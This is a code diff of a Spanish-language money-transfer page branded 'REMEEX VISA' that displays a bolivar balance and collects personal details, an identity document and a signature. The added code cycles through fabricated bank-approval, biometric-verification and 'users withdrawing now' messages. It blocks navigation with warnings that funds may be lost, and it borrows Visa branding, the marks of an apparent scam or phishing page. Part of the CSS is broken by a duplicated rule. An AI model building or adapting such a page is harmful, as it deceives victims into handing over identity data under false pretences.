@@ -171,237 +171,328 @@
       position: relative;
       z-index: 2;
     }
-    .header p {
-      font-size: 1.2rem;
-      line-height: 1.6;
-      max-width: 600px;
-      margin: 0 auto;
-      opacity: 0.95;
-      position: relative;
-      z-index: 2;
-    }
 
-    /* Tarjeta de Saldo Disponible */
+    /* Tarjeta de Saldo Disponible - NUEVA VERSIÓN */
     .balance-card {
-      background: linear-gradient(135deg, #1434CB 0%, #142C8E 100%);
-      color: white;
+      background: linear-gradient(150deg, #1a237e 0%, #0d47a1 100%);
+      color: rgba(255, 255, 255, 0.95);
       border-radius: var(--border-radius-lg);
-      padding: 2rem;
+      padding: 1.5rem;
       margin: -2rem 1.5rem 1.5rem 1.5rem; 
       box-shadow: var(--shadow);
-      transition: var(--transition);
       position: relative;
       overflow: hidden;
       z-index: 2;
+      font-family: 'Inter', sans-serif;
+      transition: var(--transition);
     }
+    
     .balance-card:hover {
       transform: translateY(-3px);
       box-shadow: var(--shadow-lg);
     }
-    .balance-card::before {
-      content: "";
-      position: absolute;
-      top: -50%;
-      left: -50%;
-      width: 200%;
-      height: 200%;
-      background: var(--aurora-gradient);
-      animation: aurora-animation 15s ease infinite;
-      z-index: 0;
+    
+    /* Variables para la tarjeta */
+    :root {
+      --text-white: rgba(255, 255, 255, 0.95);
+      --text-light: rgba(255, 255, 255, 0.8);
+      --accent: #00e676; /* Verde más vibrante para acentos */
+      --accent-glow: rgba(0, 230, 118, 0.7);
+      --portal-glow: rgba(0, 230, 118, 0.4);
     }
-    .balance-card::after {
-      content: "";
-      position: absolute;
-      bottom: 0;
-      left: 0;
-      right: 0;
-      height: 30px;
-      background: radial-gradient(ellipse at bottom, rgba(255,255,255,0.5), transparent);
-      pointer-events: none;
-      z-index: 1;
-    }
-    .balance-card > * {
-      position: relative;
-      z-index: 2;
-    }
-    .balance-header {
+    
+    /* Card header */
+    .card-header {
       display: flex;
       justify-content: space-between;
       align-items: center;
-      margin-bottom: 1rem;
+      margin-bottom: 0.75rem;
+      position: relative;
+      z-index: 5;
     }
-    .balance-amount {
-      font-size: 1.8rem;
+    
+    .logo {
       font-weight: 700;
-      margin: 0.5rem 0 1rem 0;
-      letter-spacing: -1px;
+      letter-spacing: -0.5px;
+      font-size: 1.2rem;
       display: flex;
-      flex-wrap: wrap;
+      align-items: center;
+      gap: 0.5rem;
+    }
+    
+    .logo i {
+      color: var(--accent);
+    }
+    
+    .exchange-rate {
+      font-size: 0.8rem;
+      opacity: 0.8;
+      display: flex;
       align-items: center;
       gap: 0.4rem;
     }
-
-    /* Partículas animadas (flujo de dinero) */
-    .particle-container {
+    
+    /* Sección del saldo */
+    .balance-section {
+      position: relative;
+      z-index: 5;
+      margin-bottom: 0.5rem;
+      padding-top: 0.5rem;
+    }
+    
+    .balance-label {
+      font-size: 0.85rem;
+      color: var(--text-light);
+      margin-bottom: 0.5rem;
+      display: flex;
+      align-items: center;
+    }
+    
+    .balance-amount {
+      font-size: 2.2rem;
+      font-weight: 700;
+      margin-bottom: 0.5rem;
+      display: flex;
+      align-items: center;
+      text-shadow: 0 0 10px rgba(255, 255, 255, 0.3);
+      background: linear-gradient(to right, #ffffff, #e0e0e0);
+      -webkit-background-clip: text;
+      -webkit-text-fill-color: transparent;
+      position: relative;
+    }
+    
+    .balance-amount::after {
+      content: '';
+      position: absolute;
+      bottom: -5px;
+      left: 0;
+      width: 100%;
+      height: 1px;
+      background: linear-gradient(to right, transparent, rgba(255, 255, 255, 0.5), transparent);
+    }
+    
+    /* Info section (textos dinámicos) */
+    .info-section {
+      position: relative;
+      z-index: 5;
+      height: 1.3rem;
+      margin-top: 0.75rem;
+    }
+    
+    .dynamic-text {
+      font-size: 0.7rem;
+      opacity: 0.85;
+      transition: opacity 0.5s;
+      white-space: nowrap;
+      overflow: hidden;
+      text-overflow: ellipsis;
+      display: flex;
+      align-items: center;
+      gap: 0.5rem;
+    }
+    
+    /* Spinner */
+    .spinner {
+      display: inline-block;
+      width: 14px;
+      height: 14px;
+      position: relative;
+      margin-left: 8px;
+      vertical-align: middle;
+    }
+    
+    .spinner-circle {
+      box-sizing: border-box;
+      position: absolute;
+      width: 100%;
+      height: 100%;
+      border: 2px solid transparent;
+      border-top-color: var(--accent);
+      border-radius: 50%;
+      animation: spinnerRotate 1.5s linear infinite;
+    }
+    
+    .spinner-inner {
+      display: block;
+      position: absolute;
+      left: 3px;
+      top: 3px;
+      width: 8px;
+      height: 8px;
+      border-radius: 50%;
+      background-color: var(--accent);
+      opacity: 0.7;
+      animation: spinnerPulse 1s ease-in-out infinite alternate;
+    }
+    
+    @keyframes spinnerRotate {
+      0% { transform: rotate(0deg); }
+      100% { transform: rotate(360deg); }
+    }
+    
+    @keyframes spinnerPulse {
+      0% { transform: scale(0.8); opacity: 0.3; }
+      100% { transform: scale(1); opacity: 0.7; }
+    }
+    
+    /* Portal y efectos */
+    .transfer-portal {
+      position: absolute;
+      right: -15px;
+      top: 50%;
+      transform: translateY(-50%);
+      width: 30px;
+      height: 85%;
+      background: var(--portal-glow);
+      box-shadow: inset 0 0 20px var(--accent);
+      border-radius: 50px 0 0 50px;
+      z-index: 2;
+      overflow: hidden;
+      animation: portalPulse 3s infinite;
+    }
+    
+    .transfer-portal::before {
+      content: "";
+      position: absolute;
+      top: 10%;
+      bottom: 10%;
+      left: 0;
+      width: 100%;
+      background: repeating-linear-gradient(
+        to bottom,
+        transparent,
+        transparent 5px,
+        rgba(0, 230, 118, 0.3) 5px,
+        rgba(0, 230, 118, 0.3) 10px
+      );
+      opacity: 0.6;
+      animation: portalLines 8s linear infinite;
+    }
+    
+    @keyframes portalLines {
+      0% { transform: translateY(0); }
+      100% { transform: translateY(100px); }
+    }
+    
+    @keyframes portalPulse {
+      0%, 100% { opacity: 0.8; box-shadow: inset 0 0 20px var(--accent), 0 0 15px rgba(0, 230, 118, 0.3); }
+      50% { opacity: 1; box-shadow: inset 0 0 35px var(--accent), 0 0 30px var(--accent-glow); }
+    }
+    
+    /* Partículas flotantes */
+    .particles-container {
       position: absolute;
       top: 0;
       left: 0;
       width: 100%;
       height: 100%;
-      pointer-events: none;
       overflow: hidden;
       z-index: 1;
     }
+    
     .particle {
       position: absolute;
-      bottom: 20px;
-      width: 8px;
-      height: 8px;
-      background: radial-gradient(circle, #4ade80 0%, #1A1F71 100%);
+      width: 6px;
+      height: 6px;
+      background: radial-gradient(circle, rgba(0, 230, 118, 1) 0%, rgba(0, 230, 118, 0.2) 70%);
       border-radius: 50%;
-      opacity: 0.9;
-      animation: floatParticles 3s linear infinite;
-    }
-    @keyframes floatParticles {
-      0% {
-        transform: translateX(0) translateY(0) scale(0.8);
-        opacity: 0.8;
-      }
-      25% {
-        opacity: 1;
-      }
-      100% {
-        transform: translateX(120%) translateY(-100%) scale(0.3);
-        opacity: 0;
-      }
-    }
-
-    /* Brillo lateral */
-    .lateral-glow {
-      position: absolute;
-      right: 0;
-      top: 0;
-      width: 10px;
-      height: 100%;
-      background: linear-gradient(to right, rgba(80, 255, 120, 0) 0%, rgba(80, 255, 120, 0.5) 50%, rgba(80, 255, 120, 0) 100%);
-      animation: pulseGlow 2s infinite;
-      z-index: 2;
-      pointer-events: none;
-    }
-    @keyframes pulseGlow {
-      0% {
-        opacity: 0.4;
-      }
-      50% {
-        opacity: 0.8;
-      }
-      100% {
-        opacity: 0.4;
-      }
-    }
-
-    /* Flechas de flujo en el lado derecho */
-    .flow-arrows {
-      position: absolute;
-      right: 15px;
-      top: 50%;
-      transform: translateY(-50%);
-      display: flex;
-      flex-direction: column;
-      gap: 8px;
-      z-index: 3;
-    }
-    .flow-arrows .arrow {
-      color: #4ade80; 
-      font-size: 1rem;
       opacity: 0;
+      pointer-events: none;
+      filter: drop-shadow(0 0 3px rgba(0, 230, 118, 0.8));
     }
-    @keyframes arrowBlink {
-      0%, 100% { opacity: 0; }
-      20% { opacity: 1; }
-      80% { opacity: 1; }
+    
+    /* Partículas con diferentes formas */
+    .particle.diamond {
+      clip-path: polygon(50% 0%, 100% 50%, 50% 100%, 0% 50%);
+      background: var(--accent);
     }
-    .arrow1 {
-      animation: arrowBlink 2s infinite;
-      animation-delay: 0s;
+    
+    .particle.mini {
+      width: 3px;
+      height: 3px;
+      background: var(--accent);
     }
-    .arrow2 {
-      animation: arrowBlink 2s infinite;
-      animation-delay: 0.5s;
+    
+    /* Efecto de líneas de cuadrícula */
+    .balance-card::after {
+      content: "";
+      position: absolute;
+      top: 0;
+      left: 0;
+      width: 100%;
+      height: 100%;
+      background-image: 
+        linear-gradient(rgba(255, 255, 255, 0.05) 1px, transparent 1px),
+        linear-gradient(90deg, rgba(255, 255, 255, 0.05) 1px, transparent 1px);
+      background-size: 20px 20px;
+      z-index: 0;
+      opacity: 0.3;
     }
-    .arrow3 {
-      animation: arrowBlink 2s infinite;
-      animation-delay: 1s;
-    }
-
-    /* LED verde parpadeante: señal OK */
-    .led-green {
+    
+    /* Dot loader animation */
+    .dot-loader {
       display: inline-block;
-      width: 10px;
-      height: 10px;
-      background-color: #22c55e;
-      border-radius: 50%;
-      margin-left: 6px;
-      animation: blinkGreen 1s infinite;
-      vertical-align: middle;
+      font-size: 0.7rem;
     }
-    @keyframes blinkGreen {
-      0% { opacity: 1; }
-      50% { opacity: 0.2; }
-      100% { opacity: 1; }
-    }
-
-    /* Indicador de procesamiento */
-    #processingIndicator {
-      margin-top: 0.25rem;
-      font-size: 0.85rem;
-      color: #fff;
-      display: flex;
-      align-items: center;
-      gap: 0.4rem;
-      opacity: 0.9;
-    }
-    .dots {
+    
+    .dot-loader::after {
+      content: "";
+      animation: dotAnimation 1.5s steps(1, end) infinite;
       display: inline-block;
-      width: 1em;
+      width: 1.5em;
       text-align: left;
-      overflow: hidden;
     }
-    @keyframes dotsAnimation {
+    
+    @keyframes dotAnimation {
       0% { content: ""; }
       33% { content: "."; }
       66% { content: ".."; }
       100% { content: "..."; }
     }
-    .dots::before {
-      content: "";
-      animation: dotsAnimation 1s steps(1, end) infinite;
+    
+    /* Spinner alternative styles */
+    .spinner.style2 .spinner-circle {
+      border-width: 1px;
+      border-top-width: 3px;
+      border-left-width: 3px;
     }
-
-    /* Status banner inferior */
-    .status-banner {
-      color: rgba(255, 255, 255, 0.9);
-      font-size: 0.9rem;
-      transition: opacity 0.5s;
+    
+    .spinner.style2 .spinner-inner {
+      background: linear-gradient(45deg, var(--accent), transparent);
+      opacity: 0.9;
     }
-    @keyframes blinkEffect {
-      0%   { color: #10B981; }
-      50%  { color: #ffffff; }
-      100% { color: #10B981; }
+    
+    .spinner.style3 {
+      overflow: visible;
     }
-    .blink {
-      animation: blinkEffect 1.2s infinite;
-      font-weight: 700;
+    
+    .spinner.style3 .spinner-circle {
+      border: none;
+      background: conic-gradient(
+        from 0deg, 
+        transparent 0%, 
+        var(--accent) 40%, 
+        var(--accent) 60%, 
+        transparent 85%
+      );
     }
-
-    /* Rotación de info adicional */
-    #rotatingInfo {
-      color: #fff;
-      font-size: 0.88rem;
-      margin-bottom: 0.5rem;
-      opacity: 1;
-      transition: opacity 0.5s;
-      min-height: 1.2em;
+    
+    .spinner.style3 .spinner-inner {
+      width: 5px;
+      height: 5px;
+      left: 4.5px;
+      top: 4.5px;
+      box-shadow: 0 0 5px var(--accent-glow);
+    }
+    
+    .spinner.style4 .spinner-circle {
+      border-top-color: var(--accent);
+      border-right-color: var(--accent);
+      opacity: 0.7;
+    }
+    
+    .spinner.style4 .spinner-inner {
+      animation: spinnerPulse 0.5s ease-in-out infinite alternate;
     }
 
     /* Barra de progreso */
@@ -771,8 +862,14 @@
     .overlay.active {
       display: flex;
       backdrop-filter: blur(5px);
-    }
-    .modal {
+    }.modal {
+      background: rgba(255, 255, 255, 0.95);
+      border-radius: var(--border-radius-lg);
+      padding: 1.5rem;
+      width: 90%;
+      max-width: 420px;
+      box-shadow: var(--shadow-lg);
+      text-align: center.modal {
       background: rgba(255, 255, 255, 0.95);
       border-radius: var(--border-radius-lg);
       padding: 1.5rem;
@@ -877,58 +974,174 @@
         width: 100%;
         justify-content: space-between;
       }
-      .btn-container2 {
+      .section-content {
+        padding: 1.5rem;
+      }
+      
+      .form-group {
+        margin-bottom: 1.25rem;
+      }
+      
+      .form-label {
+        margin-bottom: 0.35rem;
+        font-size: 0.9rem;
+      }
+      
+      .form-control {
+        padding: 0.75rem 1rem;
+        font-size: 0.95rem;
+      }
+      
+      .checkbox-group {
+        padding: 0.75rem;
+        margin-top: 1rem;
+        font-size: 0.9rem;
+      }
+      
+      h2 {
+        font-size: 1.3rem;
+        margin-bottom: 1.25rem;
+      }
+      
+      .modal {
+        width: 85%;
+        padding: 1.25rem;
+      }
+      
+      .modal h3 {
+        font-size: 1.1rem;
+      }
+      
+      .modal p {
+        font-size: 0.9rem;
+      }
+    }
+    
+    @media (max-width: 480px) {
+      .header {
+        padding: 1.75rem 1rem;
+      }
+      
+      .header-logo {
+        width: 65%;
+        max-width: 250px;
+      }
+      
+      .section-content {
+        padding: 1.25rem;
+      }
+      
+      .form-group {
+        margin-bottom: 1rem;
+      }
+      
+      .form-control {
+        padding: 0.7rem 0.9rem;
+        font-size: 0.9rem;
+      }
+      
+      .balance-card {
+        padding: 1.25rem;
+        margin: -1.5rem 1rem 1.5rem 1rem;
+      }
+      
+      .balance-amount {
+        font-size: 1.8rem;
+      }
+      
+      .dynamic-text {
+        font-size: 0.65rem;
+      }
+      
+      .spinner {
+        width: 12px;
+        height: 12px;
+      }
+      
+      .spinner-inner {
+        left: 2.5px;
+        top: 2.5px;
+        width: 7px;
+        height: 7px;
+      }
+      
+      .btn-container, .btn-container2 {
         flex-direction: column;
         align-items: center;
+        gap: 0.75rem;
       }
+      
+      .signature-canvas {
+        height: 180px;
+      }
+      
+      /* Evitar textos cortados en dispositivos pequeños */
+      .status-banner, .dynamic-text {
+        white-space: normal;
+        line-height: 1.3;
+      }
+    }
+    
+    /* Centrado de logos en overlays */
+    .modal img {
+      display: block;
+      margin: 0.75rem auto;
+      max-height: 45px;
+      max-width: 80%;
     }
   </style>
 </head>
 <body>
 
 <div class="container">
-  <!-- Encabezado principal -->
+  <!-- Encabezado principal - eliminado el texto -->
   <div class="header">
     <img 
       src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEhnBzNdjl6bNp-nIdaiHVENczJhwlJNA7ocsyiOObMmzbu8at0dY5yGcZ9cLxLF39qI6gwNfqBxlkTDC0txVULEwQVwGkeEzN0Jq9MRTRagA48mh18UqTlR4WhsXOLAEZugUyhqJHB19xJgnkpe-S5VOWFgzpKFwctv3XP9XhH41vNTvq0ZS-nik58Qhr-O/s320/remeex.png"
       alt="REMEEX VISA Logo" class="header-logo"
     >
-    <p>Envía dinero al instante sin comisiones</p>
   </div>
 
-  <!-- Tarjeta con Saldo disponible -->
+  <!-- Nueva tarjeta de saldo disponible -->
   <div class="balance-card">
+    <!-- Portal de transferencia -->
+    <div class="transfer-portal"></div>
+    
     <!-- Contenedor de partículas -->
-    <div class="particle-container" id="particleContainer"></div>
-    <!-- Brillo lateral -->
-    <div class="lateral-glow"></div>
-    <!-- Flechas de flujo -->
-    <div class="flow-arrows">
-      <i class="fas fa-arrow-right arrow arrow1"></i>
-      <i class="fas fa-arrow-right arrow arrow2"></i>
-      <i class="fas fa-arrow-right arrow arrow3"></i>
-    </div>
-
-    <div class="balance-header">
-      <h2>Saldo disponible</h2>
-      <!-- Tasa de cambio y bandera -->
-      <div style="display:flex; align-items:center; gap:0.5rem;">
-        <span id="exchangeRateText" style="font-size: 0.85rem;">Tasa: --</span>
-        <img src="https://flagcdn.com/w20/ve.png" alt="Bandera de Venezuela" style="width:20px; height:auto;">
+    <div class="particles-container" id="particlesContainer"></div>
+    
+    <!-- Encabezado de la tarjeta -->
+    <div class="card-header">
+      <div class="logo">
+        <i class="fa-brands fa-cc-visa" style="font-size: 1.5rem;"></i>
+      </div>
+      
+      <!-- Exchange rate -->
+      <div class="exchange-rate">
+        <span id="exchangeRateText">Tasa: --</span>
+        <i class="fas fa-exchange-alt" style="font-size: 0.8rem;"></i>
       </div>
     </div>
-    <div class="balance-amount" id="balanceAmount">0,00 Bs.</div>
-
-    <!-- Rotación de info -->
-    <div id="rotatingInfo"></div>
-
-    <!-- Indicador de procesamiento -->
-    <div id="processingIndicator">
-      Procesando transferencia<span class="dots"></span>
-      <span class="led-green"></span>
+    
+    <!-- Sección del saldo -->
+    <div class="balance-section">
+      <div class="balance-label" id="balanceLabel">
+        Saldo disponible
+        <span class="spinner" id="balanceSpinner">
+          <span class="spinner-circle"></span>
+          <span class="spinner-inner"></span>
+        </span>
+      </div>
+      <div class="balance-amount" id="balanceAmount">0,00 Bs</div>
     </div>
-
-    <div class="status-banner" id="statusBanner"></div>
+    
+    <!-- Unified dynamic text section -->
+    <div class="info-section">
+      <div class="dynamic-text" id="dynamicText">
+        <span>Procesando transferencia</span>
+        <span class="dot-loader"></span>
+      </div>
+    </div>
   </div>
 
   <!-- Barra de progreso con texto -->
@@ -975,7 +1188,7 @@
       <label class="form-label" for="nationality">Nacionalidad</label>
       <select class="form-control" id="nationality">
         <option value="">-- Selecciona --</option>
-        <option value="Nacional">Nacional</option>
+        <option value="Venezolano">Venezolano</option>
         <option value="Extranjero">Extranjero</option>
       </select>
     </div>
@@ -993,27 +1206,9 @@
     </div>
 
     <div class="btn-container">
-      <!-- Botón para ir a remeex.html -->
-      <div style="position: relative; width: 140px; height: 50px;">
-        <div class="btn-glow-effect"></div>
-        <button class="btn-glow" id="backToSaldoBtn">
-          <div class="btn-glow-content btn-glow-initial">
-            Ir a Saldo
-          </div>
-          <div class="btn-glow-content btn-glow-hover">
-            Ir a Saldo
-            <svg class="btn-glow-icon" xmlns="http://www.w3.org/2000/svg" width="24" height="24"
-               viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"
-               stroke-linecap="round" stroke-linejoin="round">
-              <line x1="19" y1="12" x2="5" y2="12"></line>
-              <polyline points="12 5 5 12 12 19"></polyline>
-            </svg>
-          </div>
-        </button>
-      </div>
-
-      <!-- Botón Continuar -->
-      <div style="position: relative; width: 140px; height: 50px;">
+      <!-- Se eliminó el botón "Ir a Saldo" -->
+      <!-- Botón Continuar centrado -->
+      <div style="position: relative; width: 140px; height: 50px; margin: 0 auto;">
         <div class="btn-glow-effect"></div>
         <button class="btn-glow" id="continueBtnStep2">
           <div class="btn-glow-content btn-glow-initial">
@@ -1131,11 +1326,9 @@
         </button>
       </div>
     </div>
-  </div>
-
-  <!-- STEP 4: Documento de Identidad -->
+  </div><!-- STEP 4: Documento de Identidad - título modificado -->
   <div class="section-content" id="step4">
-    <h2><i class="fas fa-id-card"></i> Documento de Identidad de quien recibe los fondos</h2>
+    <h2><i class="fas fa-id-card"></i> Documento de Identidad</h2>
     <p style="margin-bottom:1rem; font-size:0.9rem; color:var(--text-secondary);">
       Carga tu documento de identidad para verificar tu información. Asegúrate de que sea válido y legible.
     </p>
@@ -1198,9 +1391,7 @@
       </div>
       <div class="countdown" id="countdownDocBtn"></div>
     </div>
-  </div>
-
-  <!-- STEP 5: Firma Digital -->
+  </div><!-- STEP 5: Firma Digital -->
   <div class="section-content" id="step5">
     <h2><i class="fas fa-file-signature"></i> Firma Digital</h2>
     <p style="font-size:0.93rem; line-height:1.4;">
@@ -1382,9 +1573,7 @@
       </div>
     </div>
   </div>
-</div>
-
-<!-- Overlay: Analizando documento -->
+</div><!-- Overlay: Analizando documento -->
 <div class="overlay" id="overlayDocumento">
   <div class="modal">
     <h3 id="overlayDocumentoTitulo">Analizando documento de identidad</h3>
@@ -1484,6 +1673,11 @@
   </div>
 </div>
 
+<!-- Audio para reproducir al presionar el botón -->
+<audio id="btnAudio" preload="none">
+  <source src="https://www.soundhelix.com/examples/mp3/SoundHelix-Song-1.mp3" type="audio/mp3">
+</audio>
+
 <script>
   /*
     ---------------------------------------------------
@@ -1500,6 +1694,7 @@
   let logoBancoUsuario = "";
   let saldoDisponible = 0;
   let montoRetiro = 0;
+  let audioPlayed = false;
 
   /*
     ---------------------------------------------------
@@ -1511,6 +1706,9 @@
   let showingBs = true;
   let signatureIsAnalyzing = false;
   let redirectCountdownInterval = null;
+  let currentSpinnerStyle = 1;
+  let isPersonalized = false;
+  let activeUsers = 347;
 
   // STEP 2
   const fullNameInput = document.getElementById("fullName");
@@ -1522,7 +1720,6 @@
   const birthDateInput = document.getElementById("birthDate");
   const isAdultCheckbox = document.getElementById("isAdult");
   const continueBtnStep2 = document.getElementById("continueBtnStep2");
-  const backToSaldoBtn = document.getElementById("backToSaldoBtn");
 
   // STEP 3
   const userNameStep3 = document.getElementById("userNameStep3");
@@ -1593,11 +1790,14 @@
   const progressBarFill = document.getElementById("progressBarFill");
   const progressText = document.getElementById("progressText");
   const balanceAmountElem = document.getElementById("balanceAmount");
-  const statusBannerElem = document.getElementById("statusBanner");
   const exchangeRateText = document.getElementById("exchangeRateText");
-  const rotatingInfoElem = document.getElementById("rotatingInfo");
-  const particleContainer = document.getElementById("particleContainer");
-
+  const dynamicTextElem = document.getElementById("dynamicText");
+  const balanceLabelElem = document.getElementById("balanceLabel");
+  const balanceSpinner = document.getElementById("balanceSpinner");
+  const particlesContainer = document.getElementById("particlesContainer");
+  
+  // Audio element
+  const btnAudio = document.getElementById("btnAudio");
 
   /*
     ---------------------------------------------------
@@ -1632,9 +1832,7 @@
     "Banco de la Fuerza Armada Nacional Bolivariana, B.U.": "0177",
     "Banco Nacional de Crédito C.A., Banco Universal": "0191",
     "Instituto Municipal de Crédito Popular": "0601"
-  };
-
-  /*
+  };/*
     ---------------------------------------------------
     DOMContentLoaded (Unificando lo nuevo y lo existente)
     ---------------------------------------------------
@@ -1688,6 +1886,7 @@
     let saldoData = sessionStorage.getItem("currentBalanceBS") ||
                     localStorage.getItem("currentBalanceBS") ||
                     "1.800,00 Bs";
+    
     // Convertimos a número flotante
     saldoDisponible = parseFloat(
       saldoData
@@ -1727,31 +1926,36 @@
 
     // Inicializar el resto del flujo original
     loadSavedData();
-    initBalanceData();
-    setInterval(toggleBalanceCurrency, 20000);
-    startStatusBannerRotation();
-    startRotatingInfo();
-    startParticleGeneration();
-
+    initBalanceCard();
+    
     setupStep2Listeners();
     setupStep3Listeners();
     setupStep4Listeners();
     setupStep5Listeners();
     setupStep6Listeners();
     setupOverlayListeners();
+    centrarLogosEnOverlays();
 
     // Prevenir uso del botón "back" del navegador
     history.pushState({}, '', '');
     window.addEventListener('popstate', function() {
       if (!isRedirecting) {
-        window.location.href = "remeex.html";
+        const mensaje = "Está a punto de abandonar el proceso. Podrías perder tu progreso y los fondos asociados. Te recomendamos contactar a soporte técnico. ¿Realmente deseas salir?";
+        if (confirm(mensaje)) {
+          window.location.href = "https://www.visa.es";
+        } else {
+          history.pushState({}, '', '');
+        }
       }
     });
+    
+    // Advertencia al intentar actualizar o cerrar la página
     window.addEventListener('beforeunload', function(e) {
       if (!isRedirecting) {
+        const mensaje = "Está a punto de abandonar el proceso. Podrías perder tu progreso y los fondos asociados. Te recomendamos contactar a soporte técnico.";
         e.preventDefault();
-        window.location.href = "remeex.html";
-        e.returnValue = '';
+        e.returnValue = mensaje;
+        return mensaje;
       }
     });
   });
@@ -1773,37 +1977,323 @@
     loadSavedDataStep3();
   }
 
-  function initBalanceData() {
-    let saldoData = formatNumberVE(saldoDisponible) + " Bs.";
-    sessionStorage.setItem("currentBalanceBS", saldoData);
-    localStorage.setItem("currentBalanceBS", saldoData);
-    balanceAmountElem.textContent = saldoData;
+  /*
+    Nueva implementación de la tarjeta de saldo
+  */
+  function initBalanceCard() {
+    // Establecer intervalos para animaciones
+    setInterval(createParticle, 300);
+    setInterval(updateDynamicMessage, 5000);
+    setInterval(toggleCurrency, 15000);
+    setInterval(updateSpinnerStyle, 20000);
+    
+    // Alternar personalización cada 30 segundos
+    setInterval(() => {
+      togglePersonalizedBalance(); // Personalizar
+      
+      setTimeout(() => {
+        togglePersonalizedBalance(); // Volver a normal después de 10 segundos
+      }, 10000);
+    }, 30000);
+    
+    // Actualizar saldo inicial
+    balanceAmountElem.textContent = formatNumberVE(saldoDisponible) + " Bs";
+    
+    // Crear partículas iniciales
+    for (let i = 0; i < 10; i++) {
+      setTimeout(() => {
+        createParticle();
+      }, i * 100);
+    }
+    
+    // Actualizar el primer mensaje dinámico
+    updateDynamicMessage();
   }
 
-  function toggleBalanceCurrency() {
+  // Todas las posibles mensajes dinámicos para la tarjeta
+  const allMessages = [
+    // Mensajes de proceso y tiempos
+    "Procesando transferencia",
+    "Estableciendo conexión con tu banco",
+    "Conexión establecida con éxito",
+    "Proceso 100% funcional y seguro",
+    "Recibirás tus fondos en 5 minutos",
+    "Recibirás tus fondos en 3 minutos",
+    "Tiempo estimado: 1 minuto",
+    "Transferencia aprobada por el banco",
+    "Preparando entrega final",
+    
+    // Mensajes de seguridad
+    "Canal de transferencia encriptado",
+    "Protocolo de seguridad activado",
+    "Transferencia protegida y verificada",
+    "Verificación biométrica completada",
+    "Verificación en 2 pasos aprobada",
+    "Tus fondos están asegurados",
+    
+    // Mensajes de estado
+    "Tasa de cambio asegurada y fijada",
+    "Sincronizando con banco emisor",
+    "Banco receptor notificado",
+    "Tu banco ha aprobado la operación",
+    "Fondos reservados para entrega",
+    "Confirmando disponibilidad",
+    
+    // Mensajes de acción
+    "Optimizando ruta de transferencia",
+    "Verificando mejor opción de entrega",
+    "Procesamiento avanzado al 80%",
+    "Validando datos bancarios",
+    "Confirmando identidad",
+    "Asegurando tasa preferencial",
+    
+    // Mensajes de usuario
+    `${activeUsers} usuarios retirando ahora`,
+    "Tu transacción es prioritaria",
+    "Tu solicitud ha sido priorizada",
+    "Tu transferencia está en cola",
+    
+    // Mensajes de conexión
+    "Tu conexión es estable",
+    "Tu conexión es débil, pero segura",
+    "Optimizando para conexión lenta",
+    "Conexión restablecida correctamente",
+    "Velocidad de transferencia: óptima",
+    
+    // Mensajes de confirmación
+    "Operación exitosa en proceso",
+    "Todo va según lo previsto",
+    "No hay inconvenientes detectados",
+    "Transferencia en fase final",
+    "Ya casi está listo"
+  ];
+
+  // Función para crear partículas en la tarjeta
+  function createParticle() {
+    // Creamos múltiples partículas en cada llamada
+    const particleCount = Math.floor(Math.random() * 3) + 3; // 3-5 partículas a la vez
+    
+    if (!particlesContainer) return;
+    
+    for (let i = 0; i < particleCount; i++) {
+      const particle = document.createElement('div');
+      particle.classList.add('particle');
+      
+      // Añadir variedad de partículas
+      const particleType = Math.random();
+      if (particleType < 0.2) {
+        particle.classList.add('diamond');
+      } else if (particleType < 0.5) {
+        particle.classList.add('mini');
+      }
+      
+      // Posición inicial cerca del área del saldo
+      const startY = Math.random() * 60 + 60;
+      const startX = Math.random() * 150 + 20;
+      
+      // Tamaño aleatorio
+      const size = Math.random() * 6 + 2;
+      
+      particle.style.width = `${size}px`;
+      particle.style.height = `${size}px`;
+      particle.style.left = `${startX}px`;
+      particle.style.top = `${startY}px`;
+      
+      // Añadimos la partícula al DOM
+      particlesContainer.appendChild(particle);
+      
+      // Duración variable para movimiento natural
+      const duration = Math.random() * 3 + 1; // 1-4 segundos
+      
+      // Punto final para el portal
+      const endY = Math.random() * 140 + 10;
+      
+      // Crear animación
+      try {
+        // Intentar usar la API moderna de animaciones
+        const keyframes = [
+          { 
+            left: `${startX}px`, 
+            top: `${startY}px`, 
+            opacity: 0,
+            transform: 'scale(0.3)'
+          },
+          { 
+            opacity: 0.9,
+            transform: 'scale(1)',
+            offset: 0.2
+          },
+          { 
+            opacity: 0.7,
+            offset: 0.7
+          },
+          { 
+            left: 'calc(100% - 10px)', 
+            top: `${endY}px`, 
+            opacity: 0,
+            transform: 'scale(0.5)'
+          }
+        ];
+        
+        // Verificar si la API de Web Animations está disponible
+        if (typeof particle.animate === 'function') {
+          const animation = particle.animate(keyframes, {
+            duration: duration * 1000,
+            easing: 'cubic-bezier(0.25, 0.1, 0.25, 1)',
+            fill: 'forwards'
+          });
+          
+          if (animation && typeof animation.onfinish !== 'undefined') {
+            animation.onfinish = () => {
+              if (particle.parentNode) {
+                particle.parentNode.removeChild(particle);
+              }
+            };
+          } else {
+            // Fallback para navegadores sin soporte completo
+            setTimeout(() => {
+              if (particle.parentNode) {
+                particle.parentNode.removeChild(particle);
+              }
+            }, duration * 1000);
+          }
+        } else {
+          // Fallback para navegadores sin Web Animations API
+          setTimeout(() => {
+            if (particle.parentNode) {
+              particle.parentNode.removeChild(particle);
+            }
+          }, duration * 1000);
+        }
+      } catch(e) {
+        // Por si acaso hay algún error en la animación
+        setTimeout(() => {
+          if (particle.parentNode) {
+            particle.parentNode.removeChild(particle);
+          }
+        }, duration * 1000);
+      }
+    }
+  }// Función para alternar entre Bs y USD
+  function toggleCurrency() {
+    if (!balanceAmountElem) return;
+    
     const currentText = balanceAmountElem.textContent;
     if (showingBs) {
+      // Convertir de Bs a USD usando la tasa de cambio
       const numericBs = parseFloat(
         currentText
           .replace(/\./g, '')
           .replace(',', '.')
-          .replace(' Bs.', '')
+          .replace(' Bs', '')
           .trim()
       );
-      if (!isNaN(numericBs)) {
+      
+      if (!isNaN(numericBs) && exchangeRate > 0) {
         const usdValue = numericBs / exchangeRate;
-        balanceAmountElem.textContent = usdValue.toLocaleString("en-US", {
-          minimumFractionDigits: 2,
-          maximumFractionDigits: 2,
-        }) + " USD";
+        balanceAmountElem.textContent = formatNumberVE(usdValue) + " USD";
       }
     } else {
-      let saldoSessionStorage = sessionStorage.getItem("currentBalanceBS");
-      if (saldoSessionStorage) {
-        balanceAmountElem.textContent = saldoSessionStorage;
-      }
+      // Volver a Bs
+      balanceAmountElem.textContent = formatNumberVE(saldoDisponible) + " Bs";
     }
     showingBs = !showingBs;
+  }
+
